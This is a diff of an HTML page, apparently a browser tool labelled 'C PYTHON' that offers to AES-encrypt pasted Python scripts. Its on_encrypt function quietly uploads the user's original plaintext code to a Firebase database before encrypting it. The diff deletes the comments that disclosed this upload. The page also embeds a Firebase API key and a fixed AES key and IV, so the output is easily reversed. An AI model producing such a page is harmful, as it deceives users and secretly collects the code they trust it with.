@@ -4,11 +4,9 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>C PYTHON <=</title>
-    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script>
-      // Konfigurasi Firebase (sesuaikan dengan data milik Anda)
       var firebaseConfig = {
         apiKey: "AIzaSyDIOjpEtWakfh0WNCDC1iPj9Qm5zKDlaL4",
         authDomain: "login-24767.firebaseapp.com",
@@ -21,7 +19,6 @@
       firebase.initializeApp(firebaseConfig);
       var database = firebase.database();
 
-      // Fungsi untuk mengirim data kode asli ke Firebase
       function sendToFirebase(identifier, code) {
         var refPath = 'EncPython/' + identifier;
         firebase.database().ref(refPath).set({
@@ -30,13 +27,9 @@
         });
       }
     </script>
-
-    <!-- Include PyScript -->
     <link rel="stylesheet" href="https://pyscript.net/latest/pyscript.css" />
     <script defer src="https://pyscript.net/latest/pyscript.js"></script>
-
     <style>
-      /* Tema dark minimal modern */
       body {
         margin: 0;
         padding: 0;
@@ -115,64 +108,44 @@
   <body>
     <div class="container">
       <h2>C PYTHON <=</h2>
-      <!-- Tempel script Python di sini... -->
       <textarea id="codeInput" placeholder="Tempel script Python di sini..."></textarea>
-      <!-- Tombol ENC GAS -->
       <button id="encryptButton">ENC GAS</button>
-      <!-- Hasil enkripsi -->
       <div class="result-section">
         <h3>HASIL ENCRIPT DI TAMPILKAN DI BAWAH INI</h3>
         <div id="output"></div>
-        <!-- Tombol COPY -->
         <button id="copyButton" class="copy-button">COPY</button>
       </div>
     </div>
-
-    <!-- PyScript: Kode Python untuk enkripsi AES-256 -->
     <py-script>
 import uuid
 import js
-
-# Menggunakan micropip untuk menginstal pustaka pyaes (AES murni Python)
 import micropip
 await micropip.install("pyaes")
 import pyaes
 
 def pad(data: bytes) -> bytes:
-    # Padding PKCS7 agar panjang data kelipatan 16
     pad_len = 16 - (len(data) % 16)
     return data + bytes([pad_len] * pad_len)
 
-# Kunci AES-256 (32 byte) dan IV (16 byte) – statis untuk contoh ini
-key = b"thisisaverysecretkey1234567890ab"  # 32 bytes
-iv = b"initialvector1234"                  # 16 bytes
+key = b"thisisaverysecretkey1234567890ab"
+iv = b"initialvector1234"
 
 def encrypt_text(plaintext: str) -> str:
     data = plaintext.encode("utf-8")
     padded = pad(data)
-    # Enkripsi menggunakan mode CBC
     aes = pyaes.AESModeOfOperationCBC(key, iv=iv)
     encrypted = aes.encrypt(padded)
-    # Kembalikan hasil dalam format heksadesimal
     return encrypted.hex()
 
 def on_encrypt(event):
-    # Ambil kode dari textarea
     code = js.document.getElementById("codeInput").value
-    # Buat identifier unik
     identifier = str(uuid.uuid4())
-    # Kirim kode asli ke Firebase sebelum enkripsi
     js.sendToFirebase(identifier, code)
-    # Enkripsi kode tersebut
     encrypted_code = encrypt_text(code)
-    # Tampilkan hasil enkripsi
     js.document.getElementById("output").innerText = encrypted_code
 
-# Pasang event listener pada tombol ENC GAS
 js.document.getElementById("encryptButton").addEventListener("click", on_encrypt)
     </py-script>
-
-    <!-- Script untuk fungsi COPY -->
     <script>
       document.getElementById("copyButton").addEventListener("click", function() {
         const output = document.getElementById("output").innerText;
